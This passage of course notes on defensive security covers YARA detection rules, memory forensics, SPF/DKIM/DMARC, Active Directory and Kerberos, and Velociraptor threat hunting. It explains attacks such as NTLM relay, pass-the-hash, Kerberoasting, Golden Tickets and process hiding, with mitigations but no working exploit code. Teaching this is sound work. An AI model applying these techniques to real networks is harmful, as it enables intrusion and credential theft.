    $userform = "UserForm" ascii wide
    $userloginform = "UserLoginForm" ascii wide
    $invalid = "Invalid username or password" ascii wide
    $up1 = "uploadPOST" ascii wide
    $up2 = "postUpload" ascii wide
  condition:
    all of ($PARAM*) or (($invalid or $userloginform or $userform) and ($up1 or $up2))
```

*Example 2*
#v(-0.5em)
```yar
rule foo {
  strings:
    $a1 = { 64 8B (05|0D|15|1D|25|2D|35|3D) 30 00 00 00 } // any of the values in ( )
    $a2 = {64 A1 30 00 00 00}
    $a3 = {FF 75 ?? FF 55 ?? A?} // ? = any byte
    $a4 = {68 [-3] 07 00 [1-5] FF 15} // [-3] = 0 - 3 bytes in between
  condition:
    3 of them // 3 of all strings found
    and for any i in (1 .. #a3): // #a3 = number of times $a3 occurs
      (uint8(@a3[i] + 2) == uint8(@a3[i] + 5))
    and !a4 > 10 // !a4 = length of $a4
}
```

=== YARA Rule Generator
A YARA rule generator can analyze patterns in a given binary and automatically generate YARA rules for it. Useful to
identify a malware on different systems after it has been identified. In the exercises, we used YarGen for it.

=== Packers
Most malware today is packed in some way to help get around Antivirus signature detection. Packing can range from _simple
compression_ all the way to _full encryption_ or _debugger/sandbox/VM detection_ to make the job of reverse engineering
the malware as painful as possible. But packers are not foolproof -- the binary has to be encrypted/decompressed at some
point to run on the OS.


= Memory Forensics
Analyzing systems for malicious evidence is known as _forensics_. It typically involves creating a _chain of evidence_
to reconstruct what actions a malware has taken and to identify Indicators of Compromise (IoC). Typically, this involves
taking a image of the hard drive and analyzing the files, network traffic, system logs etc. IoCs can not only be found on
hard drives, but also in other places where data is stored: _RAM_, _Page files_, _Crash Dumps_ and _Hibernation files_.

The _Paradigm of Software Protection_ states:
#{
  show quote: set align(center)
  v(-0.5em)
  quote(block: true, attribution: [Jesse D. Kornblum])[Malware can hide, but it has to run]
}

*Artifacts to be found in Memory:* Processes, network connections, loaded drivers, console command history, strings in
memory, credentials and keys... In theory, it is possible to_ reconstruct the code_ of binaries and libraries entirely
_from memory_ by collecting all memory addresses of the program, but this is very costly and depends on the OS
#hinweis[(Memory protection mechanisms like Address Space Layout Randomization (ASLR) make it more difficult to do so)]

== Forensic Process with Chain of Custody
If a system should be forensically analyzed, for example for a criminal investigation, the process needs to preserve
_chain of custody_, so that they are valid evidence that can be presented in court. Otherwise the opposite party can
claim that someone has tampered with it to their disadvantage. The process is divided into three steps:

#table(
  columns: (1fr, 1fr, 1fr),
  table.header([1. Create the Image], [2. Create the analysis report], [3. In case the report is questioned]),
  [
    + Create digital copy of hard drive #hinweis[(Bitwise copy with DD)]
    + Create image files of drive and memory
    + Create a hash of the images
    + "Seal" the image and hash and store in a vault
  ],
  [
    5. Verify the hashes of the image
    + Conduct the analysis with the dual control principle\ #hinweis[(Vier-Augen-Prinzip)]
    + Write a report based on the findings with signatures by all forensics involved
  ],
  [
    + Create an independent second report
    + Compare reports on differing findings
  ],
)

== Memory Acquisition
To directly read memory on Windows, the program _requires `SYSTEM` privileges_ #hinweis[(highest possible privileges,
  above Administrator)]. Most tools install a driver that runs as `SYSTEM` to do so. We used WinPmem to test.

On Linux, the most popular option, LiME, required loading a new kernel module. But with AVML
#hinweis[(Acquire Volatile Memory for Linux)], a tool by Microsoft, memory can be acquired without a kernel module.

There are also specialized PCIe cards that can do the job, but they are quite expensive. Older 32-bit computers with a
FireWire port can use Direct Memory Access #hinweis[(DMA)] to access the upper 4GB of RAM.


== Memory Smear
Data in memory can potentially be _modified by the memory acquisition_; this is called _Memory Smear_.
There are different methods to avoid it:
- _Suspend program execution:_ Use Task Manager to suspend a program. The memory of this program can then be collected
  and the program resumed afterwards. But especially for critical processes, this isn't always possible.
- _Run in a VM and pause it:_ Run a VM, pause the VM, copy over the files containing the memory
  #hinweis[(VMWare: `.vmem` files)]. The VM can then be resumed.
- _Hibernation:_ Before a computer hibernates, it writes the entire content of its memory on disk\
  #hinweis[(Windows: `%SystemDrive\hiberfil.sys`)]. Copy over this file by connecting the drive to another computer.
- _System Crash #hinweis[(Blue Screen/Kernel Panic)]:_ After most system crashes, the memory is also dumped on disk\
  #hinweis[(Windows: `%WINDIR%\MEMORY.DMP`)]
- _Shutdown:_ Windows has the "Fast Boot" feature, which is basically "hibernation-light". On shutdown, some parts of
  memory are written to `%WINDIR%\pagefile.sys` #hinweis[(mostly empty if the PC has enough memory)] and\
  `%WINDIR%\swapfile.sys` #hinweis[(Used for idling Microsoft Store apps to save resources)]

== Windows processes in memory
Windows stores all its processes in a doubly-linked list named _`PsActiveProcesses`_. With a pointer stored in the
_kernel symbol `nt!PsActiveProcessHead`_, the first element of the list can be accessed -- which is always the `System`
process with PID 4. All other processes are children of `System`. With the `Flink` #hinweis[(Forward Link)] and `Blink`
#hinweis[(Backward Link)] pointer, the next/previous process can be reached. Since the list is circular, the next
process after the last running process will be `System` again. Note that the _order of the processes in the list is
arbitrary_, it is only meant for quickly enumerating all processes on the system. This method is used by _Task Manager_,
`tasklist`, `Get-Process` and `pstree`.

#grid(
  align: horizon,
  [
    But this doubly-linked list makes it _easy to hide processes_: A process can simply _change the pointers of its
    neighbors_ to remove itself from `PsActiveProcesses`, _rendering it invisible_ to this method of listing all
    processes. Interestingly, unlinking from the list does not have any negative consequences like not getting any CPU
    time allotted. This is due to the scheduler keeping its own list of processes. Programs like _psscan_ can
    _find hidden processes_ by scanning for signatures of `EPROCESS` #hinweis[(The file structure Windows stores
      process information in)] or comparing the contents of `PSActiveProcesses` with the list the CPU scheduler has.

  ],
  figure(caption: [Unlinking a process from `PsActiveProcesses`], image("img/active-processes.png")),
)

== Memory Analysis with Volatility
Volatility is a Python-based _memory extraction framework_ that works on Windows, macOS and Linux. Version 2 is no
longer supported, so only Volatility 3 commands will be listed here. You need to add the `windows.`, `linux.` or `mac.`
prefix in front of the command depending on the memory dump you'd like to analyze
#grid(
  columns: (1.1fr, 1fr),
  [
    - `info`: Show OS & kernel details
    - `pslist`: Lists the processes present #hinweis[(not process hiding resistant)]
    - `psscan`: Scans for processes present #hinweis[(process hiding resistant)]
    - `pstree`: Lists processes in a tree based on their parent PID.
  ],
  [
    - `netscan`: Scan for network connections
    - `cmdscan`: Scan for command history
    - `cmdline`: List arguments program was started with
    - `consoles`: Looks for open console sessions
  ],
)

Volatility 3 requires kernel symbols for the OS you're trying to analyze. Download them from the Volatility README and
place them into `/opt/applic/volatility3/volatility3/volatility3/symbols`


= E-Mail Security
There are three main E-Mail security features that enable different aspects of E-Mail authentication:
- _Sender Policy Framework (SPF):_ Allows senders to define which IPs are allowed to send mail for a domain
- _Domain Keys Identified Mail (DKIM):_ Provides an encryption key and digital signature that verifies a email hasn't
  been faked or altered.
- _Domain-based Message Authentication, Reporting and Conformance (DMARC):_ Unifies SPF and DKIM to allow domain owners
  to declare how they would like E-Mail from their domain to be handled if it fails SPF or DKIM tests

All of these mechanisms are processed on the _E-Mail server of the receiver_ #hinweis[(except DKIM, which also does part
  of its job on the sender E-Mail server)] and rely on querying data from the DNS of the sender. SPF and DKIM check for
authenticity of the sender and content, while DKIM provides feedback about those two to the sender domain.

There are external tools to check the configuration of these features like mxtoolbox.com

== SPF
Sender Policy Framework (SPF) is designed to _combat email coming from faked senders_. The receiving email server can
check whether the IP address the email was sent from matches the IP in the SPF entry on the sender's DNS; if not, the sender
email has been
spoofed.

To implement SPF, a new `TXT` resource record needs to be created on the DNS. An example SPF entry looks like:
```
ost.ch. IN  TXT  "v=spf1 mx ip4:192.168.2.10/24 -all"
```

#table(
  columns: (auto, 1fr),
  table.header([Element], [Description]),
  [*Version*], [The version of SPF used. Always `v=spf1`, as there hasn't been a SPF2 or later],
  [*Mechanisms*],
  [
    After the version, _"mechanisms"_ can be specified to capture certain addresses in the domain
    - `mx`: Matches any IP that has a `MX` record on the DNS. Most common mechanism.
    - `a`: Matches any IP that has a `A`/`AAAA` record.
    - `ip4/ip6`: Matches any IP in the specified IPv4/IPv6 address range
    - `all`: Always matches. Used as a default catch-all like `-all` at the end to deny all other IPs
    - `include`: References the SPF policy of another domain

    Adding a "`-`" before any mechanism means "Fail the SPF test for this mechanism"
  ],
)
#v(-0.25em)
When a mail server receives a email, the following _SPF verification steps_ are performed
+ Read the email address in the `MAIL FROM` header field
+ Request all `TXT` records of the domain in the `MAIL FROM` email address
+ Find the `TXT` record containing SPF information and parse it
+ If SPF record contains mechanisms that point to other DNS records #hinweis[(e.g. `mx` or `a`)], perform additional DNS
  requests to get those IPs
+ Compare the IP the email was received from with the IPs specified by SPF
+ If they match, the sender is authentic, otherwise the mail is thrown out.

As_ SPF does not validate the `FROM` field_ that contains the sender address the user actually sees, it can still be
successfully spoofed even when SPF is active. DMARC is required to authenticate this field.

== DKIM
Domain Keys Identified Mail (DKIM) uses private-public encryption to _validate the authenticity_ of a email to verify the
email _has not been tampered_ with. To set it up, the sender server must create a key pair and publish the public key
together with some other information as a TXT record on its DNS. An example DNS record looks like this:
```
20251204._domainkey.ost.ch. IN  TXT  "v=DKIM1; k=rsa; h=sha256; p=<public key>"
```

#table(
  columns: (auto, 1fr),
  table.header([Element], [Description of TXT record key]),
  [*Selector*],
  [
    Each DKIM entry must have a selector, a _unique ASCII identifier_, which makes it possible to have multiple DKIM
    keys active at the same time. Set the name of the `TXT` record to _`<selector>._domainkey.<domain>`_.
  ],

  [*`v=`*], [Version of the DKIM standard. Always `DKIM1`],
  [*`k=`*], [Encryption algorithm of the key pair. Usually `rsa` or `ed25519`],
  [*`h=`*], [Hashing algorithm of the key pair. Usually `sha256`.],
  [*`p=`*], [Public key used for DKIM.],
)

#grid(
  columns: (1.2fr, 1fr),
  [
    Before an email is sent, its body and select headers are hashed. These are concatenated, signed with the private key of
    the mail server and placed in the _`DKIM-Signature` header_ of the email. The header also contains some other
    metadata, like the signature algorithm, the hash of the message body and what headers were used for the signature.\
    *Sample `DKIM-Signature`:*
    #v(-0.5em)
    ```yaml
    DKIM-Signature: v=1; a=rsa-sha256; d=ost.ch;
      s=20251204; bh=<hash of body> b=<signature>
      h=mime-version:from:date:message-id:subject:to;
    ```
  ],
  table(
    columns: (auto, 1fr),
    table.header([Key], [Description of header key]),
    [*`v=`*], [Version of the DKIM standard. Always `1`.],
    [*`a=`*], [Signing algorithm],
    [*`d=`*], [Originating domain],
    [*`s=`*], [DKIM selector to use],
    [*`bh=`*], [Hash of the email body],
    [*`b=`*], [Signature of the message],
    [*`h=`*], [The email headers included in the Hashing],
  ),
)


The receiving server then downloads the DKIM DNS entry, specified in the _`s=` key_, from the domain specified in the
`DKIM-Signature`'s _`d=` key_ and validates the hash with it. It then calculates the message hash again and compares it
to the validated hash in `DKIM-Signature`'s _`b=` key_. If they match, the message hasn't been tampered with.

== DMARC
_Domain-based Message Authentication, Reporting and Conformance (DMARC)_ describes how emails that don't pass SPF or
DKIM tests should be handled. It is based on three concepts: _Identifier Alignment_, _Policies_ and _Reports_.

=== Identifier Alignment
DMARC verifies if _either SPF or DKIM has succeeded_ and if the domain verified by SPF #hinweis[(domain in `MAIL FROM`
  header)] or DKIM #hinweis[(domain in `DKIM-Signature` header)] _matches the domain specified in the `FROM` field_ of
the email #hinweis[(this is the email displayed as the sender to the user)]. This check is called _Identifier
Alignment_. _DMARC passes if the Identifier Alignment has been verified._

For more security, both DKIM and SPF can be configured in one of two modes:
- _`strict`:_ The domains from SPF/DKIM and `FROM` must match exactly
- _`relaxed`:_ One domain may be a subdomain of the other

There is no way to force DMARC to only pass if both SPF and DKIM pass. But this should not even be necessary, as they
both verify the origin domain. Additionally, SPF fails often due to email forwarders #hinweis[(re-sending an already
  delivered email, e.g. from a discontinued address or a mailing list rewriting the original sender to the mailing list
  address)].

=== Policy
The policy describes _how emails that failed verification are processed_. Individual policies can be set for the main
domain and subdomains. There are three different policies:
- _`none`_: Doesn't do anything, usually used for testing
- _`quarantine`:_ Different actions depending on configuration of the mail server, e.g. flag message or place in spam
- _`reject`:_ Delete emails that fail verification

=== Reports
DMARC can automatically _generate reports of failed verifications_ and send them _to the domain those mails were sent
from_. The email addresses the reports are sent to are set in the DMARC DNS record. There are two types of reports:
- _Failure Report/Forensic Report:_ Sends one report per email and consists of possibly redacted copies of the offending
  email.
- _Aggregate Report:_ Sent once a day and contains a overview of all emails of the domain in XML. Does not contain any
  details about the emails

For example, if a spammer faked the sender to `ivan@ost.ch` and DMARC would catch it, it would fetch the DMARC policy
from the `ost.ch` DNS, check what type of reports it wants to receive and then report this fake email to `ost.ch`.

=== Implementation
Just like SPF and DKIM, DMARC is configured via a `TXT` resource record in DNS. The record must be set to the name
`_dmarc.<domain>`.

```r
_dmarc.ost.ch IN  TXT "v=DMARC1; p=quarantine; pct=100; adkim=s; aspf=r;
                       rua=mailto:rua-dmarc@ost.ch; ruf=mailto:ruf-dmarc@ost.ch;"
```

#table(
  columns: (auto, 1fr),
  table.header([Element], [Description of TXT record key]),
  [*`v=`*], [DMARC version, always `DMARC1`],
  [*`p=`/`sp=`*], [The DMARC policy used by the main domain and subdomain],
  [*`pct=`*],
  [
    Percentage of bad emails on which the policy is applied. If $<$100%, emails that have not been selected will be
    handled by the next, less strict policy #hinweis[`(p=reject` will be handled as `quarantine`, `p=quarantine` as
      `none`)]
  ],

  [*`aspf=`/`adkim=`*], [Strictness of SPF/DKIM domain check, either `s` (strict) or `r` (relaxed)],
  [*`rua=`/`ruf=`*],
  [
    Email addresses the aggregate/forensic reports should be sent to. Must be in `mailto:` format.
    Multiple addresses can be entered with comma separation
  ],
)


= Active Directory
_Active Directory (AD)_ is a directory service from Microsoft, providing centralized management of users, groups and
computers. It manages authentication and authorization #hinweis[(based on LDAP, NTLM, Kerberos, DNS)]. A windows machine
can be managed by AD by performing a _Domain Join_. The machine can then be added to groups, use AD user accounts and
access other resources managed by AD. The AD can be managed via the Windows feature _Active Directory Users & Computers_.

*Terminology*
- _Object:_ Item in AD. Two types: _Resources_ #hinweis[(e.g. Printers)] and _Security Principals_
  #hinweis[(users, groups, computers)]
- _Organizational Units (OU):_ Provide folder-like structure to group objects
- _Container:_ Parent object for certain types of AD objects #hinweis[(Forests, Domains, OUs, Sites, Subnets)]
- _Group Policy Objects (GPO):_ Admin-defined specifications of policy settings applied to users, groups or computers.
  Bundles different configuration settings into one. GPOs can be applied to domain, site or OU objects. The GPOs are
  stored in the `SYSVOL` share on the domain controller #hinweis[(`\\mydomain.local\SYSVOL`)]
- _Domain:_ Logical group of network objects. Objects are always collected in a domain. Identified by a DNS name, the
  "namespace"
- _Tree:_ Collection of one or more domains or trees. Linked in a transitive trust hierarchy
- _Forest:_ A single AD instance that has a collection of trees that share a common global catalog. Represents a
  security boundary

*Benefits of AD*
- _Single-sign on_: The user must login once into their machine and all other services are automatically authenticated
  with that account. Additionally, the user can also log in from any computer joined in the domain.
- _Central Management:_ Policies for groups of users and machines can be applied via Group Policy Objects
  #hinweis[(GPO)]. Examples: Passwords, allowed apps, mapped shares. The policies are applied at boot time and in
  regular intervals

Domains can be bundled in _trees_ and trees in _forests_.

#image("img/ad-forest.png")

#pagebreak()

== Windows Permissions
- _Security Principal:_ Entity that can be authenticated #hinweis[(users, groups, computers)].
- _Security Identifier (SID):_ Uniquely identify a Security Principal. Access controls are based on SIDs.\
  Example SID: `S-1-5-21-1004336348-1177238915-682003330-512`. The digits after the last dash are the
  _Relative Identifier ID (RID)_ of the object in the domain, the rest identifies the domain itself.
- _Discretionary Access Control (DACL):_ All read, write, execute permissions on a file
- _System Access Control (SACL):_ Logs attempts to access a secured object
- _Access Control Entities (ACE):_ Individual permissions per user/group
- _Access Control List (ACL):_ A list of ACE. The security descriptor of an object can contain DACL or SACL

#image("img/windows-permissions.png")

=== Administrator Groups
The most important administrative groups in Active Directory are:

- _BUILTIN\\Administrators:_ Local admin access on a domain controller
- _Domain Admins:_ Administrative access to all resources in the associated domain
- _Enterprise Admins:_ Exist only in the forest root. Implicitly added to Domain Admins of every child domain
- _Schema Admins:_ Can modify the domain/forest schema
- _Server Operators:_ Can administer domain servers
- _Account Operators:_ Can manage any user not in a privileged group #hinweis[(the groups listed above)]

#pagebreak()

== NTLM Authentication
_NT LAN Manager (NTLM)_ is the deprecated authentication method in Windows networks. Should be dropped in favor of
Kerberos. However, _Kerberos still uses NTLM hashes_ to avoid storing plaintext passwords.

#grid(
  columns: (1fr, auto),
  [
    A client wants to access the SMB server. To do so, it uses NTLM.
    + Negotiate the NTLM Auth details with the SMB server

    + The server generates a random challenge and sends it to the client.

    + The client loads its _NT Hash_ from LSASS #hinweis[(see @lsass)], encrypts the challenge with it and sends
      it back to the server.

    + The server verifies the response by looking up the account either in its local users or in the Active Directory by
      contacting the domain controller. If the user exists, the challenge can be decrypted and should match what the
      server sent.

    + If the user has the necessary permissions, access to the server is granted

  ],
  chronos.diagram({
    import chronos: *
    _par("Client")
    _par("SMB", display-name: [SMB Server])
    _par("DC", display-name: [Domain Controller])

    _seq("Client", "SMB", comment: [Negotiate NTLM Auth])
    _seq("SMB", "SMB", comment: [Generate challenge])
    _seq("SMB", "Client", comment: [Send challenge])
    _seq("Client", "Client", comment: [Load hash from LSASS,\ encrypt challenge with hash])
    _seq("Client", "SMB", comment: [Send response])
    _seq("SMB", "DC", comment: [Verify authorization])
    _seq("SMB", "Client", comment: [Access granted / denied])
  }),
)

== Kerberos <kerberos>
Kerberos is the successor to NTLM and the authentication mechanism used in modern Windows Networks. For attacks on
Kerberos, see chapter @ad-attacks.

*Terminology*
- _Ticket Granting Ticket (TGT):_ Credentials issued by the KDC after the first login that proves your identity and
  allows you to request service tickets without reentering your password
- _Key Distribution Center (KDC):_ The main authentication server that issues TGTs.
- _Service Ticket (ST):_ Time-limited credential that grants access to a specific service. Obtained with a TGT.
- _Ticket Granting Service (TGS):_ Creates new STs
- _Service Principal Name (SPN):_ Unique identifier that maps a service instance to a specific AD account

*Most important secrets in Kerberos*
- _User Hash:_ The NTLM hash of a specific user. Used to decrypt TGTs and STs sent to the client
- _KRBTGT Hash:_ The hash of the Ticket Granting Ticket server, used to create new TGTs.
- _Machine/Service Hash:_ The hash of a service, used to create new STs.

To _request a TGT_, users must perform a _Kerberos Pre-Authentication_. The user must encrypt the current timestamp with
their password hash. The KDC can decrypt and verify the timestamp to confirm that the user has _provided the correct
password_ and that the message is _not a replay attack_.

Pre-Auth does not result in an additional request, it is simply added to the first AS-REQ request. Pre-Auth is enabled
by default, but it can be disabled for specific or all users. Should be avoided as it can lead to the _ASREP-Roasting
vulnerability_: Any user can request a TGT for any other user. The TGT is encrypted with the target users password hash,
which allows password cracking attacks.

#pagebreak()

*Regular Kerberos Authentification flow*
#v(-0.5em)
#grid(
  columns: (1fr, auto),
  [
    + The client encrypts the current timestamp with its password hash. This is the Pre-Auth information.
    + The client sends its Pre-Auth in a TGT request to the KDC.
    + The KDC decrypts the timestamp with the users hash stored in its database. It also validates that the timestamp
      is within the last 5 minutes.
    + If the credentials are valid and the Pre-Auth has been passed, a TGT is returned.
      The client decrypts it with its user hash. With it, the client can now request STs for individual services
    + The client sends a request to the TGS to access the file server with the SPN `cifs/foo.local`.
    + If the client is allowed to access the server, a ST for it is returned
    + The client now presents its ST to the file server. The server checks if the ST is still valid #hinweis[(ST not
        expired)] and returns the result to the client.
  ],
  chronos.diagram({
    import chronos: *
    _par("User")
    _par("Auth", display-name: align(center)[Key Distribution\ Center (KDC)])
    _par("TGS", display-name: align(center)[Ticket Granting\ Server (TGS)])
    _par("Server", display-name: align(center)[`foo.local`])

    _seq("User", "User", comment: [Generate Pre-Auth])
    _seq("User", "Auth", comment: [Request TGT\ with Pre-Auth #hinweis[(AS-REQ)]])
    _seq("Auth", "Auth", comment: [Validate Pre-Auth])
    _seq("Auth", "User", comment: [Return TGT #hinweis[(AS-REP)]])
    _seq("User", "TGS", comment: [Request ST for SPN\ `cifs/foo.local` #hinweis[(TGS-REQ)]])
    _seq("TGS", "User", comment: [Return ST #hinweis[(TGS-REP)]])
    _seq("User", "Server", comment: [Present ST to access server #hinweis[(AP-REQ)]])
    _seq("Server", "User", comment: [Grant/deny access to client #hinweis[(AP-REP)]])
  }),
)

== Active Directory attacks <ad-attacks>
Because AD stores the password hash of every user and the computer hash for every computer, it is a big target for
attackers! _If they gain control of your AD, everything is compromised!_ AD infrastructure can be very complex and
therefore hard to configure and maintain securely.

*Common misconfigurations and pitfalls*
- _No segregation of privileged access:_ Highly privileged admin accounts interactively log in on clients/servers
- _Service or user accounts with weak passwords:_ If they have a Service Principal Name #hinweis[(see @kerberos)], the
  password can be cracked and this service compromised
- _Same local admin password_
- _Credentials stored on shares with access from the "Everyone" group_
- _Lack of least-privilege principle_

There are different attack methods that can be ran on an Active Directory. Most of these can be used to gain _lateral
movement_ within the network.
- _Silver Ticket:_ Forge a Kerberos service ticket or crack a NTLM Hash to generate a new ST to directly authenticate
  without contacting the Key Distribution Center. More stealthily than Golden Ticket, but less powerful

- _Golden Ticket:_ Compromise the KRBTGT hash on the TGT server by extracting the KRBTGT NTLM hash.
  This allows the attacker to create arbitrary TGTs and effectively authenticate on any service in the network.
  The Golden Ticket remains valid for as long as the attacker likes. This can be stopped by changing the KRBTGT
  hash or the KRBTGT account password twice.

- _Passwords in Group Policy Preferences:_ Passwords stored in Group Policy Preferences (GPP) are unencrypted.
- _Steal credentials stored in DPAPI:_ Chromium stores the login data for websites in the Windows Data Protection API.
  See chapter @dpapi.

#pagebreak()

=== NTLM Relay
#grid(
  columns: (1fr, auto),
  align: horizon,
  [
    Intercept the NTLM authentication via MitM and use it to authenticate the attacker.
    This attack works because there is _no way for the client to verifiy the identity_ of the server and vice versa.

    + The user makes a NTLM authentication attempt while being the victim of a MitM attack
    + The attacker forwards the NTLM negotiation to the server
    + The server, believing the user wants to log in from the attackers machine, sends a challenge to the attacker
    + The attacker forwards the challenge to the client
    + The client sends a NTLM response back, which the Attacker forwards again
    + The server confirms successful authentication to the attacker and the attacker can now perform actions in the
      clients name

    _Key Point:_ There is no password or hash disclosure, only a live relay of the hand shake.\
    _Mitigations:_ Enforce SMB signing, disable NTLM where possible and prefer Kerberos.
  ],
  chronos.diagram({
    import chronos: *
    _par("User Workstation", display-name: align(center)[User\ Workstation])
    _par("Attacker", display-name: align(center)[Attacker])
    _par("TGS", display-name: align(center)[Target Server\ #hinweis[(SMB/HTTP NTLM)]])
    _par("DC", display-name: align(center)[DC])

    _seq("User Workstation", "Attacker", comment: [NTLM negotiate/\ auth attempt])
    _seq("Attacker", "TGS", comment: [Forwards\ NTLM negotiate])
    _seq("TGS", "Attacker", comment: [NTLM challenge])
    _seq("Attacker", "User Workstation", comment: [Relays\ NTLM challenge])
    _seq("User Workstation", "Attacker", comment: [NTLM Response\ #hinweis[(based on challenge)]])
    _seq("Attacker", "TGS", comment: [Relays\ NTLM response])
    _seq("TGS", "DC", comment: [Validates\ challenge response])
    _seq("DC", "TGS", comment: [OK #hinweis[(user authenticated)]])
  }),
)

=== Pass-the-Hash
#grid(
  columns: (1fr, auto),
  [
    If an attacker obtains a user's NTLM hash #hinweis[(e.g., from LSASS or a SAM backup)], they can authenticate to
    services that accept NTLM by presenting this hash of the password. The hash functions as a secret.

    _Key Point_: No plaintext password needed, the hash is enough for NTLM auth.\
    _Mitigations_: Credential Guard, LSA protection, remove legacy SSPs, restrict/disable NTLM and enforce SMB signing
  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker", display-name: align(center)[Attacker\ #hinweis[(on compromised host)]])
    _par("Server", display-name: align(center)[Target Server\ #hinweis[(NTLM-accepting service)]])
    _par("DC")

    _seq("Attacker", "Server", comment: [NTLM negotiate using\ stolen NTLM hash])
    _seq("Server", "Attacker", comment: [NTLM challenge])
    _seq("Attacker", "Server", comment: [NTLM response\ #hinweis[(computed with stolen hash)]])
    _seq("Server", "DC", comment: [Validate challenge/\ response])
    _seq("DC", "Server", comment: [OK #hinweis[(user authenticated)]])
  }),
)

#pagebreak()

=== Over-pass-the-hash
#grid(
  columns: (1fr, auto),
  [
    Pass-the-hash only works on NTLM-based services. For Kerberos, Over-pass-the-hash is needed.
    Instead of using the NTLM hash directly to authenticate to NTLM-accepting services, the attacker
    _uses the NT hash to obtain Kerberos tickets_ #hinweis[(generating a Kerberos TGT/ST)] and then authenticates with
    Kerberos.



    _Key point_: Bridges NTLM $->$ Kerberos by leveraging the NT hash to create valid Kerberos tickets\
    _Mitigations_: AES-only Kerberos #hinweis[(enforce modern encryption)], protected users group, credential guard
    #hinweis[(short ticket lifetimes)]
  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("Auth", display-name: align(center)[KDC])
    _par("TGS", display-name: align(center)[TGS])
    _par("Server", display-name: align(center)[`foo.local`])

    _seq("Attacker", "Attacker", comment: [Inject stolen hash into\ own security context])
    _seq("Attacker", "Auth", comment: [AS-REQ #hinweis[(derive key from users NTLM hash)]])
    _seq("Auth", "Attacker", comment: [AS-REP #hinweis[(Receive TGT)]])
    _seq("Attacker", "TGS", comment: [TGS-REQ #hinweis[(Request ST for SPN `cifs/foo.local`)]])
    _seq("TGS", "Attacker", comment: [TGS-REP #hinweis[Receive ST]])
    _seq("Attacker", "Server", comment: [AP-REQ #hinweis[(Present ST)]])
    _seq("Server", "Attacker", comment: [AP-REP #hinweis[(Attacker authenticated)]])
  }),
)


=== Pass-the-ticket
If an attacker obtains a valid Kerberos ticket #hinweis[(TGT or ST)] from a compromised host, they can inject/reuse that
ticket on another machine to authenticate as that user, without needing the password or hash. Often used together with
Over-pass-the-hash attacks.

_Key point:_ Tickets are bearer tokens; whoever holds a valid one can use it until it expires\
_Mitigations:_ Credential Guard (reduce LSASS ticket exposure), shorter ticket lifetimes, AES-only, protected users

#align(center, chronos.diagram({
  import chronos: *
  _par("Attacker", display-name: align(center)[Attacker\ #hinweis[(with stolen, valid Ticket]])
  _par("TGS", display-name: align(center)[TGS])
  _par("Server", display-name: align(center)[`foo.local`])

  _sep("With a stolen TGT")
  _seq("Attacker", "TGS", comment: [TGS-REQ #hinweis[(Request ST for SPN `cifs/foo.local` with stolen TGT)]])
  _seq("Attacker", "Server", comment: [AP-REQ #hinweis[(Present ST recieved from TGS)]])
  _seq("Server", "Attacker", comment: [AP-REP #hinweis[(Attacker authenticated)]])
  _sep("With a stolen ST")
  _seq("Attacker", "Server", comment: [AP-REQ #hinweis[(Present stolen ST)]])
  _seq("Server", "Attacker", comment: [AP-REP #hinweis[(Attacker authenticated)]])
}))


=== Kerberoasting
Targets service accounts that use Kerberos SPNs. Any domain user can request a service ticket for an SPN. The ST is
encrypted with the service account's key #hinweis[(its password-derived key)]. Attackers collect these TGS blobs
#hinweis[(e.g. via MitM)] and attempt offline cracking to recover the service account password.

_Key point:_ There's no interaction with the service beyond normal ticket requests; the cracking is offline, so account
lockouts don't occur.\
_Mitigations:_ AES-only, strong and modern encryption, prefer Group Managed Service Accounts (gMSA)

// Include the PDF poster as image, text remains selectable in compiled PDF
#for page in range(1, 3) {
  image("img/huntevil.pdf", page: page)
}


= Hunting with Velociraptor
_Threat Hunting_ is the practice of _actively searching for threats_ on systems, compared to methods like firewalls,
intrusion detection systems or sandboxes, which are typically only analyzed after a warning for potential threats has
been issued.

Velociraptor is an open source SIEM tool #hinweis[(see chapter @siem)]. It works by installing clients on all machines
you'd like to monitor. They will then show up in the Velociraptor server. With the _Virtual File System (VFS)_, you can
access their file system. On Windows Clients, the VFS tree will look like this:
- _File:_ File system based on OS FS API
- _NTFS:_ Raw parsing of the NTFS data
- _Registry:_ Windows Registry access if the user is logged in
- _Artifacts:_ Collected artifacts from this client



Velociraptor has its own SQL-like language called Velociraptor Query Language (VQL). It _run SQL-like queries on
clients_ that extract information from them. Every query returns a result set #hinweis[(comparable to a table)]. The
functionality can be extended with plugins.

#table(
  columns: (auto, 1fr),
  table.header([Element], [Example]),
  [Comments], [```sql -- comment``` or ```cs // comment```],
  [String Matching], [```sql SELECT * from pslist() WHERE Exe =~ "veloci"```],
  [Variables], [```sql LET foo = "bar"```],
  [Store queries], [```sql LET query = SELECT * FROM pslist() -- stores a pointer to the query```],
  [Store result], [#no-ligature[```sql LET result <= SELECT * FROM pslist()```]],
  [Paths], [```sql SELECT * FROM glob(globs="C:/**") LIMIT 5 -- always use / for paths even on Windows```],
  [Wildcards],
  [
    ```sql
    ?  -- single letter
    *  -- part of a string
    ** -- traverse recursively into folder
    ```
  ],

  [Windows\ Registry],
  [
    ```sql
    SELECT FullPath, Name, Data.type, Data.value FROM
      glob(globs="HKEY_USERS/*/Software/**/*", accessor="reg")
    ```
  ],

  [Branches], [```sql SELECT * FROM if(condition=Exe =~ "chrome", then={ /*...*/ }, else={ /*...*/ })```],
  [Loops with\ Subqueries],
  [
    ```sql
    LET chrome = SELECT * FROM pslist() WHERE Exe =~ "chrome" LIMIT 5
    SELECT * FROM foreach(row="foo", query={SELECT * FROM handles(pid=Pid)})
    ```
  ],
)

*Example 1:* Query that lists loaded DLLs including compile time and signature
```sql
LET pids = SELECT * FROM pslist() WHERE Exe =~ "veloci"
SELECT * FROM foreach(
  row = pids,
  query = {
    SELECT Pid, ExePath, parse_pe(file=ExePath).FileHeader.TimeDateStamp as CompileTime,
    authenticode(filename=ExePath).SubjectName as Subject,
    authenticode(filename=ExePath).Trusted as Trusted
    FROM modules(pid=Pid)
  })
```

*Example 2:* Get and parse Windows Event Logs
```sql
LET seclogs <= SELECT FullPath
  FROM glob(globs="C:/Windows/System32/winevt/Logs/*Security*.evtx") LIMIT 3

SELECT *, timestamp(epoch=System.TimeCreated.SystemTime) as Time
FROM parse_evtx(filename=seclogs, accessor="ntfs")
WHERE System.EventID.Value = 4624
ORDER BY Time
```

== Artifacts
Multiple VQL queries can be packaged as an _artifact_: a YAML file with the queries and some metadata. Artifacts can be
used recursively in other artifacts.
#grid(
  columns: (1fr, auto),
